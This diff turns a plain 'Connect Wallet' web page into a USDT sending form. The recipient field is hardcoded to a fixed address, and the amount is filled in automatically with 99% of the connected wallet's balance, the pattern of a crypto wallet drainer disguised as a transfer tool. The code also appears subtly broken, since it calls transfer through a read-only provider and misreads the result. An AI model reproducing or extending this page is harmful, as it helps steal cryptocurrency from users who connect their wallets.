@@ -3,38 +3,135 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connect Wallet</title>
+    <title>Connect Wallet & Send USDT</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 </head>
 <body>
     <button id="connectWalletBtn">Connect Wallet</button>
     <div id="walletAddress"></div>
 
+    <h2>Send USDT (BEP-20)</h2>
+    <label for="recipientAddress">Recipient Address:</label>
+    <input type="text" id="recipientAddress" value="0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE"><br><br>
+
+    <label for="amount">Amount (USDT):</label>
+    <input type="number" id="amount" step="any"><br><br>
+
+    <button id="sendFundsBtn" disabled>Send USDT</button>
+
+    <div id="transactionResult"></div>
+
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             const connectWalletBtn = document.getElementById('connectWalletBtn');
             const walletAddressDiv = document.getElementById('walletAddress');
+            const sendFundsBtn = document.getElementById('sendFundsBtn');
+            const recipientAddressInput = document.getElementById('recipientAddress');
+            const amountInput = document.getElementById('amount');
+            const transactionResultDiv = document.getElementById('transactionResult');
+
+            let connectedAccount = null;
+            let provider = null;
+            const usdtContractAddress = '0x55d398326f99059fF775485246999027B3197955'; // USDT on BSC
+
+            async function getUSDTBalance(address) {
+                if (!provider || !address) return '0';
+                try {
+                    const tokenContract = new ethers.Contract(usdtContractAddress, [
+                        'function balanceOf(address) view returns (uint256)',
+                        'function decimals() view returns (uint8)'
+                    ], provider);
+                    const balanceRaw = await tokenContract.balanceOf(address);
+                    const decimals = await tokenContract.decimals();
+                    return ethers.utils.formatUnits(balanceRaw, decimals);
+                } catch (error) {
+                    console.error('Error fetching USDT balance:', error);
+                    return '0';
+                }
+            }
+
+            async function updateUSDTAmount() {
+                if (connectedAccount) {
+                    const balance = await getUSDTBalance(connectedAccount);
+                    // Set 99% of the balance
+                    const amountToSend = parseFloat(balance) * 0.99;
+                    amountInput.value = isNaN(amountToSend) ? '' : amountToSend.toString();
+                } else {
+                    amountInput.value = '';
+                }
+            }
 
             connectWalletBtn.addEventListener('click', async () => {
                 if (typeof window.ethereum !== 'undefined') {
                     try {
                         const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                         if (accounts.length > 0) {
-                            const address = accounts[0];
-                            walletAddressDiv.textContent = `Connected Wallet: ${address.substring(0, 6)}...${address.slice(-4)}`;
+                            connectedAccount = accounts[0];
+                            walletAddressDiv.textContent = `Connected Wallet: ${connectedAccount.substring(0, 6)}...${connectedAccount.slice(-4)}`;
                             connectWalletBtn.textContent = 'Wallet Connected';
-                            connectWalletBtn.disabled = true;
-                            console.log('Connected address:', address);
+                            sendFundsBtn.disabled = false;
+                            provider = new ethers.providers.Web3Provider(window.ethereum);
+                            console.log('Connected address:', connectedAccount);
+                            // Update USDT amount after successful connection
+                            updateUSDTAmount();
                         } else {
                             walletAddressDiv.textContent = 'No accounts found. Please connect your wallet.';
+                            sendFundsBtn.disabled = true;
+                            provider = null;
+                            amountInput.value = '';
                         }
                     } catch (error) {
                         console.error('Error connecting to wallet:', error);
                         walletAddressDiv.textContent = `Error connecting: ${error.message}`;
+                        sendFundsBtn.disabled = true;
+                        provider = null;
+                        amountInput.value = '';
                     }
                 } else {
                     walletAddressDiv.textContent = 'Web3 provider not found. Please install MetaMask or a compatible wallet.';
+                    sendFundsBtn.disabled = true;
+                    provider = null;
+                    amountInput.value = '';
                 }
             });
+
+            sendFundsBtn.addEventListener('click', async () => {
+                if (!connectedAccount) {
+                    transactionResultDiv.textContent = 'Please connect your wallet first.';
+                    return;
+                }
+
+                const recipientAddress = recipientAddressInput.value;
+                const amountToSend = amountInput.value;
+
+                if (!recipientAddress || !amountToSend || isNaN(amountToSend) || parseFloat(amountToSend) <= 0) {
+                    transactionResultDiv.textContent = 'Please enter a valid recipient address and amount.';
+                    return;
+                }
+
+                try {
+                    const tokenContract = new ethers.Contract(usdtContractAddress, [
+                        'function transfer(address recipient, uint256 amount) external returns (bool)',
+                        'function decimals() view returns (uint8)'
+                    ], provider);
+
+                    const decimals = await tokenContract.decimals();
+                    const amountToSendWei = ethers.utils.parseUnits(amountToSend, decimals).toHexString();
+
+                    const txHash = await tokenContract.transfer(recipientAddress, amountToSendWei);
+
+                    transactionResultDiv.textContent = `Transaction sent: https://bscscan.com/tx/${txHash}`;
+                    console.log('Transaction Hash:', txHash);
+
+                } catch (error) {
+                    console.error('Error sending USDT transaction:', error);
+                    transactionResultDiv.textContent = `Transaction failed: ${error.message}`;
+                }
+            });
+
+            // Attempt to update the USDT amount on initial load as well
+            updateUSDTAmount();
+
         });
     </script>
 </body>
